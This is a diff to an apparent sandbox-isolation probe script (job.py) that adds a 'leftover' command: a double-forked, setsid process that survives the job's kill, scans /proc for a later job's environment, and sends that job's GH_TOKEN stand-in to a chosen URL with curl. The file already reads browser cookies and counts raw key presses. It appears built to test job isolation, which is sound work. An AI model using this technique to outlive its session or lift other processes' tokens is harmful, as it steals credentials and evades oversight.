@@ -11,6 +11,9 @@ usage: job.py bridge <fill|logins|get|askme> [timeout]   print the raw reply, ba
        job.py proc                                       the X1-X7 and B6 checks, as key=value lines
        job.py cookies                                    read signed-in cookie rows from the browser profile
        job.py xi2 <seconds>                              count raw key presses seen on the display
+       job.py leftover <url> <seconds>                   leave a process behind this job that waits for a
+                                                         later job marked J8B=1 and calls <url> with that
+                                                         job's stand-in and proxy settings, read from /proc
 Nothing here prints a secret in plain: replies are base64'd so only the harness reads them.
 """
 import base64
@@ -346,6 +349,47 @@ def xi2(seconds):
     print("XI2 rawkeys", count)
 
 
+def leftover(url, seconds):
+    """A process that outlives its job (a new session, so the job's group
+    kill misses it), as a program a job started could leave behind. It reads
+    a later job's environment from /proc and uses that job's GH_TOKEN
+    stand-in through that job's proxy settings. What it got is in
+    ~/probe/j8.out: the HTTP status only, never a value."""
+    import subprocess
+    out = os.path.expanduser("~/probe/j8.out")
+    if os.fork():
+        print("LEFTOVER started")
+        return
+    os.setsid()
+    if os.fork():
+        os._exit(0)
+    null = os.open(os.devnull, os.O_RDWR)
+    for fd in (0, 1, 2):
+        os.dup2(null, fd)
+    me = os.getpid()
+    end = time.time() + float(seconds)
+    said = "NOVICTIM"
+    while time.time() < end and said == "NOVICTIM":
+        for pid in [p for p in os.listdir("/proc") if p.isdigit() and int(p) != me]:
+            try:
+                raw = open(f"/proc/{pid}/environ", "rb").read()
+            except Exception:
+                continue
+            if b"J8B=1" not in raw.split(b"\0"):
+                continue
+            env = dict(kv.decode(errors="replace").split("=", 1) for kv in raw.split(b"\0") if b"=" in kv)
+            if "GH_TOKEN" not in env or "HTTPS_PROXY" not in env:
+                continue
+            r = subprocess.run(["curl", "-s", "-m8", "-o", "/dev/null", "-w", "%{http_code}", url,
+                                "-H", "Authorization: Bearer " + env["GH_TOKEN"]], env=env, capture_output=True, text=True)
+            said = f"USED victim={pid} status={r.stdout.strip() or 'none'} curl={r.returncode}"
+            break
+        time.sleep(0.3)
+    with open(out, "w") as f:
+        f.write(said + "\n")
+    os._exit(0)
+
+
 if __name__ == "__main__":
     cmd = sys.argv[1]
     if cmd == "bridge":
@@ -364,3 +408,5 @@ if __name__ == "__main__":
         cookies()
     elif cmd == "xi2":
         xi2(sys.argv[2])
+    elif cmd == "leftover":
+        leftover(sys.argv[2], sys.argv[3])
